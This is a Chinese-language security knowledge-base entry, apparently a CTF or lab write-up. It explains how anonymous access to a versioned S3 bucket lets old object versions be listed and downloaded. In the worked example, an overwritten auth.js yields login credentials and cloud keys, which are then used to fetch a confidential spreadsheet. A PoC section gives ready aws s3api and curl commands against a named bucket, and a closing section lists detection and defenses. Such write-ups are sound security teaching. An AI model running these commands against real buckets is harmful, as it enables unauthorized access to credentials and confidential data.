---
id: cloud-s3-versioning-hidden-old-object-credential-recovery
title: S3 版本控制下匿名 list-object-versions：下载旧版 auth.js 恢复已删除凭据，并用旧版机密 xlsx 取数
type: scenario
domain: cloud
path: cloud
technique: s3-object-versioning-old-version-recovery
tags:
- cloud
- aws
- s3
- versioning
- object-storage
- credential-leak
- information-disclosure
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V657
  verified_at: '2026-11-13T06:37:10+08:00'
  notes: 已对照原文核对 x-amz-version-id 探测、list-object-versions 旧版本、旧 auth.js 凭据与旧版 xlsx 下载；get-bucket-versioning 原文即失败，未实机复现
url: /docs/cloud/cloud-s3-versioning-hidden-old-object-credential-recovery/
draft: false
kb_aliases:
- S3 版本控制泄露
- list-object-versions
- x-amz-version-id
- 旧版本对象恢复
- auth.js 旧版本凭据
- 已删除对象仍可下载
---

## 一句话结论

S3 桶启用版本控制后，每次覆盖/删除都会保留旧版本；若桶策略允许匿名或低权读取，`aws s3api list-object-versions --no-sign-request` 会列出所有旧版本的 `VersionId`，用 `get-object --version-id` 即可下载已被覆盖的旧 `static/js/auth.js`（内含账号口令）和旧版机密 xlsx，恢复本应消失的凭据与敏感文件。

## 原理

- **版本控制保留全部历史**：启用后，对象的每次 PUT/DELETE 都生成新版本，`ListObjectVersions` 返回 Key、VersionId、IsLatest、LastModified、Size 等；删除只是添加 delete marker，旧版本仍可读取。
- **权限常按桶/前缀粗放**：桶策略若允许匿名 `s3:GetObject`/`s3:ListBucketVersions`（常见于静态站），旧版本同样落在授权范围内；开发者以为"文件删了/覆盖了就安全"，忽略了版本层。
- **版本 ID 可发现**：对对象发 `HEAD`/`curl -I` 会返回 `x-amz-version-id` 响应头，即使不枚举版本也能看出桶启用了版本控制；随后 `list-object-versions` 全量列出。
- **恢复为何有价值**：旧版前端 JS 可能保留已被移除的账号口令/API key；旧版报表/备份可能是唯一含敏感数据的版本。本例旧 `auth.js` 泄露登录凭据，登录后在 profile 页拿到 AK/SK，再用该凭据下载 `private/` 下的旧版机密 xlsx 得到 flag。

## 触发条件

- 目标 S3 桶启用了版本控制，且桶策略/ACL 允许匿名或低权主体 `ListBucketVersions` 与 `GetObject`。
- 桶内历史版本中存在含凭据的源码/配置或敏感文档（即使当前版本已清理）。
- 从旧版本中获得的凭据仍有效（或可登录业务系统再取云凭据）。

## 利用步骤

1. 对桶内对象 `curl -I`，观察 `x-amz-version-id` 确认版本控制已开启。
2. `aws s3api list-object-versions --bucket <bucket> --region <region> --no-sign-request` 列出所有对象的版本（含 `IsLatest=false` 的旧版本与 delete marker）。
3. 找到可疑旧版本（如 `static/js/auth.js` 的旧 VersionId），`aws s3api get-object --bucket <bucket> --key <key> --version-id <vid> auth.js --no-sign-request` 下载。
4. 从旧 JS 中提取账号口令，登录业务系统；在个人资料/配置页找到 AK/SK 并配置。
5. 用新凭据下载旧版敏感对象（如 `private/Business Health - Board Meeting (Confidential).xlsx` 的旧 VersionId），读取 flag/机密数据。

## PoC

```bash
# 1) 探测版本控制
curl -I https://huge-logistics-dashboard.s3.eu-north-1.amazonaws.com/static/js/auth.js
#   -> x-amz-version-id: <vid>

# 2) 匿名列出所有版本
aws s3api list-object-versions --bucket huge-logistics-dashboard \
  --region eu-north-1 --no-sign-request

# 3) 下载旧版 auth.js
aws s3api get-object --bucket huge-logistics-dashboard --region eu-north-1 \
  --key static/js/auth.js --version-id <old-vid> auth.js --no-sign-request

# 4) 登录后取得 AK/SK，再下载旧版机密 xlsx
aws s3api get-object --bucket huge-logistics-dashboard --region eu-north-1 \
  --key "private/Business Health - Board Meeting (Confidential).xlsx" \
  --version-id <old-vid> 1.xlsx
```

## 变体与关联

- 变体：`list-object-versions` 还返回 DeleteMarker，可配合 `get-object` 指定版本绕过"已删除"；也可枚举旧版备份/.env/terraform state。
- 变体：拿到 AWS 凭据后，对其它桶重复版本枚举（版本控制往往是账号级习惯）。
- 关联：[[cloud-object-storage-bucket-acl-misconfig]]（桶 ACL 公共读）、[[cloud-cloud-iam-access-key-info-account-id-password-reuse-console]]（旧 JS 凭据复用登录）、[[pentest-recon-git-deleted-branch-reflog-ds-store-path]]（同一"删除不等于消失"思路的代码仓库版本）。

## 检测与防御

- 敏感桶禁用公共访问/公共 List，静态资源与业务/备份桶分离；启用 Block Public Access。
- 对含敏感数据的桶避免"公开读 + 版本控制"叠加；配置生命周期规则定期过期非当前版本；对 delete marker 做告警。
- 代码/文档中的凭据使用 secret scanning 清理并轮换；旧版本中的 secret 也要视为已泄露。
- 检测：S3 访问日志/CloudTrail 中异常的 `ListObjectVersions`、大量 `GetObject` 指定旧 VersionId 的请求（尤其是 `--no-sign-request` 的匿名访问）。
